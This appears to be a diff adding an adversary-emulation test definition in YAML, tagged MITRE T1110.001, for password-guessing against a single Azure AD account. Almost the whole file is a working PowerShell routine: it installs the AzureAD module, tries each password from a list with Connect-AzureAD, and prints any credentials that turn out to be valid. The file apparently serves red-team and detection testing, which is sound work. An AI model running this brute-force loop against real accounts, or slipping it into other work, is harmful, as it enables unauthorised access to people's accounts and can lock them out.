@@ -1,0 +1,52 @@
+api_version: "2.0"
+name: Brute Force Credentials of single Azure AD user
+description: |
+    Attempt to brute force Azure AD user via AzureAD powershell module.
+args:
+    - name: username
+      type: string
+      default: bruce.wayne@contoso.com
+    - name: passwords
+      type: string
+      default: Password1`n1q2w3e4r`nPassword!
+uuid: 5a51ef57-299e-4d62-8e11-2d440df55e69
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1110: Brute Force'
+    subtechniques:
+        - 'T1110.001: Password Guessing'
+requirements:
+    platforms:
+        - os: azure-ad
+steps:
+    - name: |
+        AzureAD module must be installed.
+      inline: |
+        try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {{Install-Module -Name AzureAD -Force
+        }}} catch {exit 1}
+      executor: powershell
+    - name: brute-force-credentials-of-single-azure-ad-user
+      inline: |
+        Import-Module -Name AzureAD
+
+        $passwords = "{{.Args.passwords}}".split("{`n}")
+        foreach($password in $passwords) {
+          $PWord = ConvertTo-SecureString -String "$password" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "{{.Args.username}}", $Pword
+          try {
+            Write-Host " [-] Attempting ${password} on account {{.Args.username}}."
+            Connect-AzureAD -Credential $Credential 2>&1> $null
+            # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+            Write-Host " [!] {{.Args.username}}:${password} are valid credentials!`r`n"
+            break
+          } catch {
+            Write-Host " [-] {{.Args.username}}:${password} invalid credentials.`r`n"
+          }
+        }
+        Write-Host "End of bruteforce"
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
